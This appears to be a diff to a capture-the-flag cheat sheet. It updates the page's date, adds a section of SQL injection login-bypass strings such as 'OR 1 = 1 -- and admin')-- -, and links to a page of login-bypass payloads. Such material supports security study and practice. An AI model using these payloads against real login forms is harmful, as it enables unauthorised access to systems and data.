@@ -6,7 +6,7 @@ title: CTF Cheat Sheet
 
 # {% include alchemy-fire.html %} CTF CheatSheet
 
-### UPDATE DATE: 17 Apr 2026
+### UPDATE DATE: 14 Aug 2026
 * TOC
 {:toc}
 
@@ -239,6 +239,21 @@ ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames.txt:HFU
 
 ---
 
+# {% include alchemy-fire.html %} Web Attack
+
+## SQL Injection
+
+```bash
+'OR 1 = 1 --
+Adminstrator'OR 1 = 1 --
+Admin'OR 1 = 1 -- 
+Admin ' or '1' = '1 #  
+admin')-- -
+Admin')-- -
+```
+
+---
+
 # {% include alchemy-fire.html %} Vulnerability Scanner
 
 ```bash
@@ -413,6 +428,9 @@ https://github.com/brightio/penelope
 
 # Pre-Created Computer Accounts
 https://trustedsec.com/blog/diving-into-pre-created-computer-accounts
+
+# SQL Login Bypass Payloads
+https://hacktricks.wiki/en/pentesting-web/login-bypass/sql-login-bypass.html
 ```
 
 ---
